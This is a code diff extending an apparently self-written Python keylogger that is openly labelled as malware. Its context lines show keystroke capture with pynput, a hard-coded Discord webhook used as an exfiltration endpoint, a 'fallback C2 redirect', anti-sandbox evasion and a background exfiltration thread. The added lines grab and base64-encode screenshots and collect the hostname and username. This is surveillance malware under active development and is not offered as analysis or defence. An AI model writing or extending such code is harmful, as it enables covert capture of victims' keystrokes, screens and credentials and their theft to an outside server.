@@ -1,10 +1,10 @@
-import os, re, time, random, datetime, requests, threading, base64
+import os, re, time, random, datetime, requests, threading, base64, socket, subprocess
 from pynput import keyboard
+import mss
 from hashlib import sha256
-import platform
 import getpass as gt
 from Cryptodome.Cipher import AES
-from Cryptodome.Util.Padding import pad
+from Cryptodome.Util.Padding import unpad
 import psutil
 
 # === ORIGINAL CORE VARIABLES ===
@@ -15,6 +15,29 @@ discord = "https://discord.com/api/webhooks/1405520151142600726/pdA3Whgfdlt0HycR
 esp_page = ""  # Optional fallback C2 redirect
 current_word = ""
 buffer = []
+
+
+
+with mss.mss() as sct:
+    # The monitor or screen part to capture
+    monitor = sct.monitors[1]  # or a region
+
+    # Grab the data
+    sct_img = sct.grab(monitor)
+
+    # Generate the PNG
+    png_binary = mss.tools.to_png(sct_img.rgb, sct_img.size)
+    png_base64 = base64.b64encode(png_binary).decode('utf-8')
+
+    
+with open("filebyte.txt", "a") as fb:
+    fb.write(f"{png_base64}")
+    
+
+def screenshot():
+    with mss.mss() as sct:
+        filename = sct.shot(output="screenshot.png")
+    print(f"Screenshot saved as {filename}")
 
 # === PHASE 1: Anti-Sandbox / Evasion ===
 def evade_sandbox():
@@ -99,9 +122,10 @@ def send_buffer(url):
 
 
 def  sys_info():
-    name = gt.getuser
+    compturename = socket.gethostname()
+    username = gt.getuser( )
+    print(f"Hostname:", compturename,username)
     #homename = platform.node( )
-    print(f"This is the system os:homename \nThis is the Username; {name}")
 
 
 # === BACKGROUND EXFIL THREAD ===
